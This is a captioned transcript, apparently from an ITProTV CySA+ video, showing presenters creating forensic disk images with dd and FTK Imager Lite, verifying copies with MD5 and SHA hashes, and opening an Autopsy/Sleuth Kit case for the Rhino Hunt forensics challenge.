00:12:58.261\nThis isn't you copy and\npasting files into a folder.\n\n259\n00:12:58.261 --> 00:13:00.639\nYou're using things like write blockers,\n\n260\n00:13:00.639 --> 00:13:03.540\nso that there's no write\nback to the original drive.\n\n261\n00:13:03.540 --> 00:13:07.326\nAlways maintaining that integrity,\nand you can use those hardwares.\n\n262\n00:13:07.326 --> 00:13:09.838\nRemember, we went through that\nwhen we were creating our toolkit,\n\n263\n00:13:09.838 --> 00:13:12.325\nwe have hardware ability to do that,\nsoftware ability to do that.\n\n264\n00:13:12.325 --> 00:13:16.817\nDD is some software that\ncan help us do that, okay?\n\n265\n00:13:16.817 --> 00:13:21.668\nSo let me pull out of here, and\nlet's get into how do I use DD\n\n266\n00:13:21.668 --> 00:13:26.128\nto create a forensically\nsound image of this device?\n\n267\n00:13:26.128 --> 00:13:30.027\nWell hey, you might want to throw\nin one of those write blocker, so\n\n268\n00:13:30.027 --> 00:13:31.709\nthat there is no write back.\n\n269\n00:13:31.709 --> 00:13:33.642\nSo there's software versus that,\nyou can do that.\n\n270\n00:13:33.642 --> 00:13:37.546\nMaybe I'm running inside of Caine,\nor it already does that by default,\n\n271\n00:13:37.546 --> 00:13:39.086\nso that would be nice for us.\n\n272\n00:13:39.086 --> 00:13:43.043\nBut if not you know what to do,\nget that write blocker enabled, and\n\n273\n00:13:43.043 --> 00:13:44.747\nthen we'll go to Kali here.\n\n274\n00:13:44.747 --> 00:13:48.230\nMost systems of Linux,\nDD has been around a while,\n\n275\n00:13:48.230 --> 00:13:52.858\nit's typically referred to as\nthe data duplicator, I've heard?\n\n276\n00:13:52.858 --> 00:13:57.589\nOr affectionately referred to as\nthe data destroyer, the same does.\n\n277\n00:13:57.589 --> 00:14:00.402\nIf you mess this up,\nit is going to mess things up.\n\n278\n00:14:00.402 --> 00:14:02.429\nSo definitely know how to do this.\n\n279\n00:14:02.429 --> 00:14:04.253\nLet's do it,\nlet me show you how to create this.\n\n280\n00:14:04.253 --> 00:14:09.301\nLet say you wanted to created a partition,\nan image of a partition.\n\n281\n00:14:09.301 --> 00:14:10.453\nNo problem.\n\n282\n00:14:10.453 --> 00:14:13.005\nYou say DD, probably you wanna\nrun pseudo if you're not,\n\n283\n00:14:13.005 --> 00:14:15.570\nI'm logging in as ruth cuz I'm in Kali,\nbut there you go.\n\n284\n00:14:15.570 --> 00:14:18.636\nIs that good enough size, Mike?\n\n285\n00:14:18.636 --> 00:14:19.294\n&gt;&gt; Maybe a little bit bigger?\n\n286\n00:14:19.294 --> 00:14:20.044\n&gt;&gt; A little bit bigger?\n\n287\n00:14:20.044 --> 00:14:21.366\nI just want to make sure everyone can see.\n\n288\n00:14:21.366 --> 00:14:21.888\nHow about that?\n\n289\n00:14:21.888 --> 00:14:22.553\nThat looks good.\n\n290\n00:14:22.553 --> 00:14:23.552\nDD.\n\n291\n00:14:23.552 --> 00:14:24.826\nSo DD, all right, there we are.\n\n292\n00:14:24.826 --> 00:14:27.564\nSo you do iF=.\n\n293\n00:14:27.564 --> 00:14:30.848\nSo, iF is the input file.\n\n294\n00:14:30.848 --> 00:14:37.305\nAnd then you give it the input file,\nso this would be /dev/sda.\n\n295\n00:14:37.305 --> 00:14:38.398\nThis is a partition.\n\n296\n00:14:38.398 --> 00:14:41.409\nIt would be like SDA1 or SDA2.\n\n297\n00:14:41.409 --> 00:14:45.516\nWhatever partition it is that you want,\nyou gotta know the number of it and\n\n298\n00:14:45.516 --> 00:14:48.046\nwhere that partition\nresides on the system.\n\n299\n00:14:48.046 --> 00:14:50.711\nBut we should be able to figure that out\npretty easily cuz we're tech people,\n\n300\n00:14:50.711 --> 00:14:51.413\nthat's what we do.\n\n301\n00:14:51.413 --> 00:14:56.622\nThat would be the partition I wanna copy,\nso that's gonna be my input file.\n\n302\n00:14:56.622 --> 00:14:59.328\nThen my output file is going to be of=,\n\n303\n00:14:59.328 --> 00:15:03.435\nthen maybe I've got another\npartition I'm gonna copy to.\n\n304\n00:15:03.435 --> 00:15:05.532\nMaybe a USB drive, whatever.\n\n305\n00:15:05.532 --> 00:15:06.464\nPut that device in there.\n\n306\n00:15:06.464 --> 00:15:12.750\nSo /dev/, what is it, like,\nttyUSB or something like that.\n\n307\n00:15:12.750 --> 00:15:16.326\nSometimes you see that, or\nmaybe it's just another,\n\n308\n00:15:16.326 --> 00:15:18.980\nshows up as another drive up partition.\n\n309\n00:15:18.980 --> 00:15:22.438\nSo could be sdb1 on a different drive.\n\n310\n00:15:22.438 --> 00:15:25.557\nSo I plugged in in a different drive,\nit's got a partition on it,\n\n311\n00:15:25.557 --> 00:15:28.961\nthat's what I'm going to copy of to and\nI'm gonna pull that drive, and\n\n312\n00:15:28.961 --> 00:15:31.087\nthat's I'm gonna do my investigation on.\n\n313\n00:15:31.087 --> 00:15:32.852\nSo how will I do that?\n\n314\n00:15:32.852 --> 00:15:38.742\nProbably the things you typically\nyou wanna do with this is to bs=64k,\n\n315\n00:15:38.742 --> 00:15:41.789\nlike so, and that's the block size.\n\n316\n00:15:41.789 --> 00:15:46.744\nThe default I think is 512 if I'm not\nmistaken, but we work on modern systems.\n\n317\n00:15:46.744 --> 00:15:51.698\nDD's been around for awhile and you can\nget away with things like 64K, right?\n\n318\n00:15:51.698 --> 00:15:56.975\nOther things you'll probably\nwant to do is conv=noerror and\n\n319\n00:15:56.975 --> 00:16:01.338\nsync, like so,\nwhich means that when we're doing\n\n320\n00:16:01.338 --> 00:16:06.324\nthe conversion if you come\nacross a read error Keep going.\n\n321\n00:16:06.324 --> 00:16:09.347\nSo don't stop cuz you came\nacross a ready error, okay?\n\n322\n00:16:09.347 --> 00:16:14.950\nAnd then sync is also grab metadata and\nso important part of that.\n\n323\n00:16:14.950 --> 00:16:15.520\n&gt;&gt; Cool.\n\n324\n00:16:15.520 --> 00:16:16.060\n&gt;&gt; Let's see here.\n\n325\n00:16:16.060 --> 00:16:16.680\nAnything else here.\n\n326\n00:16:16.680 --> 00:16:21.050\nOne more thing, status, I like to\nthrow us on there, equals progress.\n\n327\n00:16:21.050 --> 00:16:24.450\nJust so I can see, what's going on,\nwhat are we doing?\n\n328\n00:16:24.450 --> 00:16:27.040\nJust a little some visual back at me.\n\n329\n00:16:27.040 --> 00:16:28.481\nI'm not gonna fire this off, A,\n\n330\n00:16:28.481 --> 00:16:31.170\nbecause I don't believe I have\nthose partitions on my drive.\n\n331\n00:16:31.170 --> 00:16:34.030\nAnd B, it's a large drive.\n\n332\n00:16:34.030 --> 00:16:36.250\nThis can take some time.\n\n333\n00:16:36.250 --> 00:16:38.860\nSo be aware of that as you're\ncreating these images.\n\n334\n00:16:40.090 --> 00:16:42.773\nIf you want to do the entire drive,\nnot just the partition.\n\n335\n00:16:42.773 --> 00:16:46.563\nWell we'll just come back over here and\noop,\n\n336\n00:16:46.563 --> 00:16:50.470\ndestroy that, and do the same thing here.\n\n337\n00:16:50.470 --> 00:16:54.210\nJust give it the disk,\nnot the partition, right?\n\n338\n00:16:54.210 --> 00:16:58.440\nAnother thing that you can use to\naccomplish this feed is the FTK,\n\n339\n00:16:58.440 --> 00:17:03.810\nactually does have a free utility\nwhich is the disk imager light.\n\n340\n00:17:03.810 --> 00:17:06.870\nSo maybe you're in a Windows system and\nyou wanna do something like this.\n\n341\n00:17:06.870 --> 00:17:09.610\nFTK Disk Imager Lite is at your beck and\ncall.\n\n342\n00:17:09.610 --> 00:17:10.380\nDownload that.\n\n343\n00:17:10.380 --> 00:17:14.780\nI think I actually did install it or\nget it installed.\n\n344\n00:17:14.780 --> 00:17:17.750\nYeah, there we go, FTK Disk Imager Lite.\n\n345\n00:17:17.750 --> 00:17:21.350\nOkay, yes, and here we go.\n\n346\n00:17:22.430 --> 00:17:26.750\nAnd we're gonna Add Evidence Item, Add\nAll Detached Devices, do Image Mounting,\n\n347\n00:17:26.750 --> 00:17:28.720\nCreate a Disk Image, and there you go.\n\n348\n00:17:28.720 --> 00:17:31.760\nYou would just start pointing it and\nfollowing the prompts as you were.\n\n349\n00:17:31.760 --> 00:17:34.920\nObviously, it's gonna be a whole lot\neasier to use Disk Imager Lite than\n\n350\n00:17:34.920 --> 00:17:38.680\nit will be to use dd because of\nthe command line aspect of it.\n\n351\n00:17:38.680 --> 00:17:41.950\nBut as you get more familiar with dd,\nit's really not that bad.\n\n352\n00:17:43.120 --> 00:17:44.070\nI can kinda show you.\n\n353\n00:17:44.070 --> 00:17:46.510\nI can kinda give you\nan example of dd though.\n\n354\n00:17:46.510 --> 00:17:47.150\nLet's do this.\n\n355\n00:17:47.150 --> 00:17:49.290\nI need all of this.\n\n356\n00:17:49.290 --> 00:17:53.259\nJust gonna make a quick\ndd copy of something.\n\n357\n00:17:53.259 --> 00:17:55.527\nLet's do an ls.\n\n358\n00:17:55.527 --> 00:17:59.612\nHow about the denial of service\nscript that we created?\n\n359\n00:17:59.612 --> 00:18:01.542\n&gt;&gt; Mm-hm.\n&gt;&gt; Let's do that.\n\n360\n00:18:01.542 --> 00:18:04.914\nSo dd if=\n\n361\n00:18:04.914 --> 00:18:11.661\n/root/ddos.sh\n\n362\n00:18:11.661 --> 00:18:21.364\nof=/root/spoit.dd.\n\n363\n00:18:21.364 --> 00:18:26.009\n[INAUDIBLE] there you go, one record in,\none record out, easy peasy.\n\n364\n00:18:26.009 --> 00:18:31.581\nDo an ls, I should now have a sploit.dd\nfile which I do right here,\n\n365\n00:18:31.581 --> 00:18:33.880\nand I have made a copy of it.\n\n366\n00:18:33.880 --> 00:18:37.193\nSo pretty simple, that's just a very\nsimple way because I'm not gonna copy\n\n367\n00:18:37.193 --> 00:18:39.287\na hard drive right now,\nit'd take us forever.\n\n368\n00:18:39.287 --> 00:18:44.810\nAll right so there's DD,\nthere's FTK Imager Lite, very cool stuff.\n\n369\n00:18:44.810 --> 00:18:45.806\nBe familiar with them.\n\n370\n00:18:45.806 --> 00:18:48.630\nUnderstand what each of these\ntools are a requirement for,\n\n371\n00:18:48.630 --> 00:18:52.720\nwhich is creating images of your drives.\n\n372\n00:18:54.030 --> 00:18:56.410\nAll right Mikey, let's move on.\n\n373\n00:18:56.410 --> 00:18:59.916\nSo now, I've actually downloaded.\n\n374\n00:18:59.916 --> 00:19:04.504\nAll right, let's go back here\nreally quickly with our Rhino hunt.\n\n375\n00:19:04.504 --> 00:19:06.230\nWhat can we do?\n\n376\n00:19:06.230 --> 00:19:11.330\nLet's now open autopsy,\nlet's now start looking at this data and\n\n377\n00:19:11.330 --> 00:19:14.310\nsee what the heck can we do with this,\nright?\n\n378\n00:19:14.310 --> 00:19:18.183\nSo, I'm going to go, let's start with\nLinux and then we're moving to Windows.\n\n379\n00:19:18.183 --> 00:19:23.324\nFirst thing I wanna do\nis run The Sleuth Kit.\n\n380\n00:19:23.324 --> 00:19:28.204\nSo I've downloaded the Rhino stuff,\nthis where I was testing things and\n\n381\n00:19:28.204 --> 00:19:32.210\nnow RHINO2 is a pristine version,\nso let's cd into that.\n\n382\n00:19:32.210 --> 00:19:37.372\nRHINO2, I do an ls,\nthere's the three log files and\n\n383\n00:19:37.372 --> 00:19:40.942\nthe RHINOUSB.dd file that we have.\n\n384\n00:19:40.942 --> 00:19:42.560\nGreat, we're good to go.\n\n385\n00:19:42.560 --> 00:19:46.730\nSo now I wanna start adding\nthis to my management software.\n\n386\n00:19:46.730 --> 00:19:48.512\nWhich is going to be on my suite,\n\n387\n00:19:48.512 --> 00:19:52.700\nit's my forensic suite which will\nbe on Linux will be The Sleuth Kit.\n\n388\n00:19:52.700 --> 00:19:54.020\nEven though uit's still labeled autopsy.\n\n389\n00:19:54.020 --> 00:19:58.280\nIt's the same company but they create\none for Linux and one for Windows.\n\n390\n00:19:58.280 --> 00:20:00.070\nI will go ahead and tell you this.\n\n391\n00:20:00.070 --> 00:20:03.290\nThis is one of those times where\nI go go with the Windows version.\n\n392\n00:20:03.290 --> 00:20:06.791\n&gt;&gt; Really?\n&gt;&gt; Yes, the Sleuth Kit is good,\n\n393\n00:20:06.791 --> 00:20:08.928\nAutopsy is better.\n\n394\n00:20:08.928 --> 00:20:11.471\nIt is better and\nyou'll see why here in just a moment.\n\n395\n00:20:11.471 --> 00:20:17.960\nSo let's kinda run through this\nas a Linux user would, okay?\n\n396\n00:20:19.480 --> 00:20:25.410\nSo applications, I believe if I go\nto Forensics, there is a Autopsy.\n\n397\n00:20:25.410 --> 00:20:31.910\nI can fire that off, and\nnow I can just open up my browser.\n\n398\n00:20:31.910 --> 00:20:35.930\nCopy and paste that into it,\nI will just say open link,\n\n399\n00:20:37.420 --> 00:20:42.230\nin a second my browser will open and\nwe will be at the autopsy.\n\n400\n00:20:42.230 --> 00:20:43.020\nThere we go.\n\n401\n00:20:43.020 --> 00:20:46.240\nVery plain Jane, very simple format.\n\n402\n00:20:46.240 --> 00:20:48.530\nYou just gotta kinda know\nwhat you wanna do here.\n\n403\n00:20:48.530 --> 00:20:54.486\nSo I wanna,\nsee if I can't increase this a little bit.\n\n404\n00:20:54.486 --> 00:20:56.751\nMaybe it's Ctrl+, there we go, Ctrl+.\n\n405\n00:20:56.751 --> 00:20:57.975\nHopefully that's a little easier to see.\n\n406\n00:20:57.975 --> 00:20:58.475\n&gt;&gt; Mm-hm.\n\n407\n00:20:59.550 --> 00:21:02.840\n&gt;&gt; So here we go, we can open a case,\nyou can start a new case.\n\n408\n00:21:02.840 --> 00:21:04.431\nIf we need help, we can click there.\n\n409\n00:21:04.431 --> 00:21:06.670\nI'm gonna go ahead and\nsay this is a new case.\n\n410\n00:21:06.670 --> 00:21:09.160\nI'm gonna click on that case name.\n\n411\n00:21:09.160 --> 00:21:11.710\nThe name of this investigation only\ncontains letters and numbers and\n\n412\n00:21:11.710 --> 00:21:15.372\nwe'll call this RHINOHUNT, RHINOHUNT.\n\n413\n00:21:15.372 --> 00:21:18.645\n[LAUGH] Come and get your rhinos, right?\n\n414\n00:21:18.645 --> 00:21:20.477\n&gt;&gt; [LAUGH]\n&gt;&gt; Two for a dollar.\n\n415\n00:21:20.477 --> 00:21:25.563\nDescription, so we can say\n\n416\n00:21:25.563 --> 00:21:33.330\nU of New Orleans like so, Rhino-case.\n\n417\n00:21:33.330 --> 00:21:34.650\nJust giving it some information.\n\n418\n00:21:34.650 --> 00:21:37.350\nIf I wanna say my investigative name,\nput my name in.\n\n419\n00:21:37.350 --> 00:21:41.100\nYou can see I've done this before so\nit's already got me saved in its database.\n\n420\n00:21:41.100 --> 00:21:45.755\nSo we put that there,\nlet's scroll down and we will hit NewCase.\n\n421\n00:21:46.900 --> 00:21:51.225\nAll right, it's creating the case, Rhino\nHunt gives us the case directory where\n\n422\n00:21:51.225 --> 00:21:54.430\nit's asked if we wanna go into\nthis in the command line.\n\n423\n00:21:54.430 --> 00:21:56.740\nWe could do that, or the terminal.\n\n424\n00:21:56.740 --> 00:22:00.858\nAnd now we must create a host for\nthis case, we're gonna add a host.\n\n425\n00:22:00.858 --> 00:22:03.350\nSo now we can give the host its name.\n\n426\n00:22:03.350 --> 00:22:07.214\nI can call it,\nwhat was the actual dd file?\n\n427\n00:22:07.214 --> 00:22:10.021\nThat's what I'm looking for.\n\n428\n00:22:10.021 --> 00:22:13.715\nIt was RHINOUSB.dd.\n\n429\n00:22:13.715 --> 00:22:14.590\nSo let's bring that back.\n\n430\n00:22:15.860 --> 00:22:21.030\nI hate that when I go full-screen I\ncan't get that stupid sidebar to pop up.\n\n431\n00:22:21.030 --> 00:22:27.645\nHere we go, so we'll call it,\nyeah RhinoUSB.\n\n432\n00:22:27.645 --> 00:22:30.400\nIf you wanna put description, you can,\nput the time zone in, that's fine.\n\n433\n00:22:30.400 --> 00:22:32.390\nI'm gonna kind of leave\nall this blank here.\n\n434\n00:22:32.390 --> 00:22:36.020\nPath of the alert hash database,\nif you know that, you put that in but\n\n435\n00:22:36.020 --> 00:22:37.880\nbasically we're just gonna hit Add Host.\n\n436\n00:22:39.190 --> 00:22:39.960\nAnd there we go.\n\n437\n00:22:39.960 --> 00:22:43.047\nAdding host: RHINOUSB to case RHINOHUNT.\n\n438\n00:22:43.047 --> 00:22:44.180\nThis tells me where it is.\n\n439\n00:22:44.180 --> 00:22:46.660\nThe configuration file for\nthis, all great stuff.\n\n440\n00:22:46.660 --> 00:22:48.860\nNow we're gonna add the image.\n\n441\n00:22:48.860 --> 00:22:53.060\nSo this is where I need\nto grab that .dd file and\n\n442\n00:22:53.060 --> 00:22:56.600\nbring it into the Sleuth Kit,\nso it can start analyzing it.\n\n443\n00:22:56.600 --> 00:22:58.610\nIt's all about analyzing that data.\n\n444\n00:22:58.610 --> 00:23:02.510\nSo I hit Add Image File,\nlocation, where's that at?\n\n445\n00:23:02.510 --> 00:23:08.342\nSo that's in /root/rhino,\nbut it's not rhino2.\n\n446\n00:23:08.342 --> 00:23:10.897\nOr it's not rhino anymore,\nnow it's rhino2.\n\n447\n00:23:10.897 --> 00:23:15.190\nThere we go, and then here,\nthis is a partition.\n\n448\n00:23:15.190 --> 00:23:19.220\nSo I need to know that, we've gotten that\ninformation from the body that gave it to\n\n449\n00:23:19.220 --> 00:23:21.740\nme or if I took the image myself.\n\n450\n00:23:21.740 --> 00:23:24.020\nI would know that information,\nit would be documented and\n\n451\n00:23:24.020 --> 00:23:26.620\nlogged, you would know about that.\n\n452\n00:23:26.620 --> 00:23:29.628\nSo it's not a disk,\nit is a partition of a disk.\n\n453\n00:23:29.628 --> 00:23:33.523\nAnd I will do a copy to bring\nit in instead of a sim link.\n\n454\n00:23:33.523 --> 00:23:38.242\nSo there are reasons why you would choose\neither a sim link, a copy, or a move.\n\n455\n00:23:38.242 --> 00:23:41.728\nYou would need to make those\ndecisions yourself at the time for\n\n456\n00:23:41.728 --> 00:23:46.390\nwhatever reasons you have,\nbased on your experience and environment.\n\n457\n00:23:46.390 --> 00:23:47.650\nAll right, so I'm gonna click Next.\n\n458\n00:23:49.090 --> 00:23:50.570\nHere we have the local names,\n\n459\n00:23:50.570 --> 00:23:55.180\ndata integrity, and MD5 hash can be used\nto verify the integrity of the image.\n\n460\n00:23:55.180 --> 00:23:57.624\nThis is an important thing\nthat you guys want to do.\n\n461\n00:23:57.624 --> 00:24:02.519\nIt's actually kind of skipping around\nin my notes here, but hashing.\n\n462\n00:24:02.519 --> 00:24:03.438\nI'll go ahead and cover it.\n\n463\n00:24:03.438 --> 00:24:06.725\nHashing is a good way to verify\nthe integrity of the data that you're\n\n464\n00:24:06.725 --> 00:24:07.481\nworking with.\n\n465\n00:24:07.481 --> 00:24:13.073\nYou can create MD5 hashes,\nSHA1, SHA256, SHA512,\n\n466\n00:24:13.073 --> 00:24:20.410\nyou name it, you can use these things to\nverify that they are as they were, okay?\n\n467\n00:24:20.410 --> 00:24:23.610\nWe know what it looks like in\nthe state that we needed it.\n\n468\n00:24:23.610 --> 00:24:28.602\nWe take an MD5 hash and you think,\nMD5's kinda like old and busted, ain't it?\n\n469\n00:24:28.602 --> 00:24:32.950\nAnd, yeah,\nI wouldn't say hide your passwords in it.\n\n470\n00:24:32.950 --> 00:24:33.821\n&gt;&gt; Right.\n&gt;&gt; But,\n\n471\n00:24:33.821 --> 00:24:38.356\nfor verify the integrity of\nthe data it works just fine.\n\n472\n00:24:38.356 --> 00:24:39.595\nIt's a fantastic thing.\n\n473\n00:24:39.595 --> 00:24:40.649\n&gt;&gt; It's nice, quick, light.\n\n474\n00:24:40.649 --> 00:24:43.690\n&gt;&gt; Yeah, exactly, so to be able to say,\n\n475\n00:24:43.690 --> 00:24:47.981\nI can look at this file run\nan MD 5# on it, excuse me.\n\n476\n00:24:47.981 --> 00:24:51.303\nGet the hash, and then look at my copy,\n\n477\n00:24:51.303 --> 00:24:55.247\nrun MD5 hash on the copy and\nsee do they match.\n\n478\n00:24:55.247 --> 00:24:58.180\nWe can actually show you\na demonstration of that here.\n\n479\n00:24:58.180 --> 00:25:00.731\nLet me shrink that, let's go back here.\n\n480\n00:25:00.731 --> 00:25:05.233\nIf I back up out of this, if you remember,\n\n481\n00:25:05.233 --> 00:25:12.327\nwe took a dd copy of ddos.sh and\nwe called it sploit.dd, right?\n\n482\n00:25:12.327 --> 00:25:13.640\nDo they match up?\n\n483\n00:25:13.640 --> 00:25:17.007\nDid it accurately copy that file bit for\nbit?\n\n484\n00:25:17.007 --> 00:25:18.126\n&gt;&gt; I don't know.\n\n485\n00:25:18.126 --> 00:25:23.738\n&gt;&gt; I don't know, we can run\nthe MD5# to find out, I can say,\n\n486\n00:25:23.738 --> 00:25:29.360\nmd5sum, and then feed it ddos.sh,\nand there is my hash.\n\n487\n00:25:30.470 --> 00:25:32.780\nSo there's the hash for DDOSSH.\n\n488\n00:25:32.780 --> 00:25:36.225\nNow, I do the same thing,\nbut I run it against my\n\n489\n00:25:36.225 --> 00:25:43.345\nsploit.dd, I called it sploit.\n\n490\n00:25:43.345 --> 00:25:47.940\n[LAUGH] I named it wrong, so\nthat's fine, it's sploit.\n\n491\n00:25:47.940 --> 00:25:52.720\nThere we go and now, I can compare the\nvalues and see that the data integrity is\n\n492\n00:25:52.720 --> 00:25:59.060\ngood, that the copy is a bit-for-bit copy,\neverything is as is in the original.\n\n493\n00:25:59.060 --> 00:26:06.285\nI can do the same thing with Sha,\nyou can just say shasum [COUGH] like so,\n\n494\n00:26:06.285 --> 00:26:11.795\nthe ddos.sh, and it cranks out,\nand then do that for\n\n495\n00:26:11.795 --> 00:26:16.963\nsploit.dd and we see,\nthe shasum works as well.\n\n496\n00:26:16.963 --> 00:26:21.479\nIf you wanna use more robust\nshasums you can do -a and\n\n497\n00:26:21.479 --> 00:26:27.390\nsay 256, just tell it what\nversion of Sha you wanna run.\n\n498\n00:26:27.390 --> 00:26:28.900\nYou'll notice these keep\ngetting longer and longer,\n\n499\n00:26:28.900 --> 00:26:33.130\nbecause they're more\nrobust hash calculations.\n\n500\n00:26:33.130 --> 00:26:35.938\nAll right,\nI know we're running out of time, Mike.\n\n501\n00:26:35.938 --> 00:26:37.520\nI'm gonna button us up.\n\n502\n00:26:37.520 --> 00:26:40.340\nI guess we're going into a part two,\nbecause there's a lot for us to do, but\n\n503\n00:26:40.340 --> 00:26:42.350\nit's a lot of fun, right?\n\n504\n00:26:42.350 --> 00:26:45.430\nAll right, let's get back to\nthe Sleuth Kit, bring that up.\n\n505\n00:26:45.430 --> 00:26:50.360\nSo here we can calculate an MD5#,\nmake sure that happens, I'll go ahead and\n\n506\n00:26:50.360 --> 00:26:53.960\nsay, yeah, calculate that,\nthat's great, I appreciate it.\n\n507\n00:26:53.960 --> 00:26:59.480\nAnd, then it says, analysis of the image\nfile shows the following partitions.\n\n508\n00:26:59.480 --> 00:27:04.143\nAnd if you see anything that's no,\nno it's not it was actually NTFS,\n\n509\n00:27:04.143 --> 00:27:07.019\nyou can change that if you\nhave those options here.\n\n510\n00:27:07.019 --> 00:27:08.860\nGo in there and make the change.\n\n511\n00:27:08.860 --> 00:27:12.590\nBut it correctly saw the types of\npartition and the drive number or\n\n512\n00:27:12.590 --> 00:27:14.690\nletter and it brought it incorrectly.\n\n513\n00:27:14.690 --> 00:27:15.349\nSo now I hit Add.\n\n514\n00:27:16.744 --> 00:27:20.391\nAll right, this could take a while, but\nit didn't, cuz it's calculating 95,\n\n515\n00:27:20.391 --> 00:27:21.861\nthat's super quick operation.\n\n516\n00:27:21.861 --> 00:27:24.940\n[LAUGH] But here we go,\ncopying images to evidence locker.\n\n517\n00:27:24.940 --> 00:27:27.489\nThis could also take a while depending\non the size of the partition of\n\n518\n00:27:27.489 --> 00:27:28.840\nthe drive that you are bringing in.\n\n519\n00:27:28.840 --> 00:27:33.130\nIt could take a minute,\nvolume, image, there we go.\n\n520\n00:27:33.130 --> 00:27:36.920\nEverything looks good, I hit OK, and now.\n\n521\n00:27:36.920 --> 00:27:41.900\nI'm in my case gallery, I can see my case,\nI have my drive there and\n\n522\n00:27:41.900 --> 00:27:44.570\nI can start hitting details or\nanalyzing it.\n\n523\n00:27:44.570 --> 00:27:46.280\nAnd I guess we're gonna save that for\npart two.\n\n524\n00:27:46.280 --> 00:27:47.283\n&gt;&gt; And we'll click.\n\n525\n00:27:47.283 --> 00:27:48.770\n&gt;&gt; Maybe we'll click all right?\n\n526\n00:27:48.770 --> 00:27:51.645\nBut you see how the suite has\ngotten us to where we're at.\n\n527\n00:27:51.645 --> 00:27:53.370\n&gt;&gt; Mm-hm, very good.\n\n528\n00:27:53.370 --> 00:27:55.510\n&gt;&gt; All right, good,\nyeah, nice cliff hanger.\n\n529\n00:27:55.510 --> 00:27:56.800\n&gt;&gt; Yeah.\n&gt;&gt; On the edge obviously,\n\n530\n00:27:56.800 --> 00:27:59.890\nwaiting to see what we can\ndo next with that sweet.\n\n531\n00:27:59.890 --> 00:28:00.990\nSo we appreciate that, Daniel.\n\n532\n00:28:00.990 --> 00:28:04.723\nI hope everyone joins us back for a part\n2, but for now signing off for ITPROTV,\n\n533\n00:28:04.723 --> 00:28:06.410\nI've been your host Mike Rodrick.\n\n534\n00:28:06.410 --> 00:28:07.693\n&gt;&gt; And I'm David Lowrie.\n\n535\n00:28:07.693 --> 00:28:09.213\nAnd we'll see you next time.\n\n536\n00:28:09.213 --> 00:28:16.312\n[MUSIC]\n\n537\n00:28:16.312 --> 00:28:16.900\n&gt;&gt; Thank you for watching, ITProTV.\n\n",

00:00:08.275\n[MUSIC]\n\n4\n00:00:08.275 --> 00:00:12.739\n&gt;&gt; You're watching ITPro.TV.\n&gt;&gt; Hello,\n\n5\n00:00:12.739 --> 00:00:17.074\nwelcome to another exciting episode here\nat ITPro.TV, I'm your host, Mike Rodrick.\n\n6\n00:00:17.074 --> 00:00:19.106\nToday we're doing our CYSA+, and\n\n7\n00:00:19.106 --> 00:00:23.490\nin this episode we're taking a look\nat forensic suites and utilities.\n\n8\n00:00:23.490 --> 00:00:25.940\nThis is a part two, so if you missed\nthe first one, make sure you go back and\n\n9\n00:00:25.940 --> 00:00:26.840\ncheck that one out.\n\n10\n00:00:26.840 --> 00:00:28.727\nBut back in studios with\nus is none other than Mr.\n\n11\n00:00:28.727 --> 00:00:31.418\nDaniel Lowrie, welcome back, Daniel.\n&gt;&gt; Thanks for having me again, Mike.\n\n12\n00:00:31.418 --> 00:00:33.950\nYeah, we're kicking\nback more on our CYSA+.\n\n13\n00:00:33.950 --> 00:00:36.720\nGonna look at those cool utilities and\n\n14\n00:00:36.720 --> 00:00:39.490\nforensic suites that we\nhave at our fingertips.\n\n15\n00:00:39.490 --> 00:00:43.331\nAll we gotta do is employ them so that we\ncan find some information about any of\n\n16\n00:00:43.331 --> 00:00:46.581\nthe incidences that may have occurred,\nhopefully not though.\n\n17\n00:00:46.581 --> 00:00:51.290\nBut if they do, we're trying to get\nyou guys prepared for that very event.\n\n18\n00:00:51.290 --> 00:00:53.520\nSo that you can gather\nall the evidence and\n\n19\n00:00:53.520 --> 00:00:54.840\nprosecute to the full extent of the law.\n\n20\n00:00:54.840 --> 00:00:56.680\nPut someone under the prison.\n\n21\n00:00:56.680 --> 00:00:58.965\nWell, maybe not that one,\nyou know [LAUGH].\n\n22\n00:00:58.965 --> 00:00:59.926\n&gt;&gt; [LAUGH] Depends on what they did and\n\n23\n00:00:59.926 --> 00:01:00.688\nwhat they stole, right?\n\n24\n00:01:00.688 --> 00:01:02.255\nYeah [LAUGH].\n&gt;&gt; That's right.\n\n25\n00:01:02.255 --> 00:01:03.084\n&gt;&gt; All right, so we looked at\n\n26\n00:01:03.084 --> 00:01:03.660\na couple of them.\n\n27\n00:01:03.660 --> 00:01:05.744\nWe looked at a couple operating systems.\n\n28\n00:01:05.744 --> 00:01:08.774\nCane and Swift, we looked at FTK,\n\n29\n00:01:08.774 --> 00:01:12.717\nwhat's next on our list?\n&gt;&gt; Well if you remember when we left off\n\n30\n00:01:12.717 --> 00:01:15.565\nin our previous episode,\nwe're gonna do our little rehash.\n\n31\n00:01:15.565 --> 00:01:16.970\n&gt;&gt; That's right, the cliffhanger.\n\n32\n00:01:16.970 --> 00:01:18.600\n&gt;&gt; We left you with a cliffhanger.\n\n33\n00:01:18.600 --> 00:01:22.315\nWe had an image, remember we were doing\nthe Rhino Hunt forensic challenge.\n\n34\n00:01:22.315 --> 00:01:23.048\n&gt;&gt; That's right.\n\n35\n00:01:23.048 --> 00:01:25.704\n&gt;&gt; And they give us an image and\n\n36\n00:01:25.704 --> 00:01:31.489\nsome logs that we imported into\nmy Kali box and we had ready.\n\n37\n00:01:31.489 --> 00:01:35.181\nOpened up the Sleuth Kit,\nwhich is also autopsy, they are one and\n\n38\n00:01:35.181 --> 00:01:37.345\nthe same as far as their company goes.\n\n39\n00:01:37.345 --> 00:01:40.454\nRuns a little bit differently on\nLinux than it does in Windows,\n\n40\n00:01:40.454 --> 00:01:42.813\nand we'll see that here\nin not too much longer.\n\n41\n00:01:42.813 --> 00:01:45.496\nBut we've been in the Sleuth Kit\nbecause we're in Linux.\n\n42\n00:01:45.496 --> 00:01:51.770\nWe've imported the DD image that we\nreceived from our client, right?\n\n43\n00:01:51.770 --> 00:01:54.891\nThat we're looking for specific data,\nwhich are rhinoceros pictures,\n\n44\n00:01:54.891 --> 00:01:57.392\nit's against the law, a horrible thing.\n&gt;&gt; More than nine.\n\n45\n00:01:57.392 --> 00:02:00.378\n&gt;&gt; Yeah, I think we had about ten, yeah,\n\n46\n00:02:00.378 --> 00:02:01.471\nthere you go.\n\n47\n00:02:01.471 --> 00:02:04.769\nRhino pictures are apparently\nthe dirty stuff of\n\n48\n00:02:04.769 --> 00:02:07.730\nthe future.\n&gt;&gt; Very creative with their little\n\n49\n00:02:07.730 --> 00:02:10.367\nexercise.\n&gt;&gt; It gives you that realistic kind of\n\n50\n00:02:10.367 --> 